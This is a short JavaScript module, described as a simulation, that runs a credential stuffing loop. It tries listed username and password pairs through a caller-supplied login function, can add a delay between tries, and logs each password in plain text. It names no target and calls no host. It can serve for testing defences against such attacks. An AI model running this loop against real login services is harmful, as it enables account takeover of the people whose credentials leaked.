/**
 * Simulates a credential stuffing attack.
 * @param {string} username The username.
 * @param {string} password The password.
 * @param {function} attemptLogin Attempts login.
 * @returns {Promise<boolean>} Login status.
 */
async function tryLogin(username, password, attemptLogin) {
  try {
    const result = await attemptLogin(username, password);
    return result;
  } catch (error) {
    console.error(`Login failed for user ${username}:`, error.message || error); // Log more details and include username
    return false;
  }
}

/**
 * Executes credential stuffing.
 * @param {Array<{username: string, password: string}>} credentials User credentials.
 * @param {function} attemptLogin Attempts login.
 * @param {function} onCredentialAttempted Callback after each attempt.
 * @param {number} [delay=0] Delay in milliseconds between login attempts.
 * @returns {Promise<boolean>} Overall success.
 */
async function credentialStuffingAttack(credentials, attemptLogin, onCredentialAttempted, delay = 0) {
  let success = false;
  let successfulUsername = null;

  for (const credential of credentials) {
    const { username, password } = credential;

    if (delay > 0) {
      await new Promise(resolve => setTimeout(resolve, delay)); // Introduce delay
    }

    const result = await tryLogin(username, password, attemptLogin);

    if (result) {
      success = true;
      successfulUsername = username;
      console.log(`Success: ${username}, ${password}`);
      break; // Stop after first successful login
    } else {
      console.log(`Failed: ${username}, ${password}`);
    }

    if (onCredentialAttempted) {
      try {
        onCredentialAttempted(username, password, result);
      } catch (error) {
        console.error("Error in onCredentialAttempted callback:", error); // Handle errors in the callback
      }
    }
  }

  if(success) {
      console.log(`Credential stuffing attack successful. User "${successfulUsername}" logged in.`);
  } else {
      console.log("Credential stuffing attack failed. No successful logins.");
  }

  return success;
}

export { tryLogin, credentialStuffingAttack };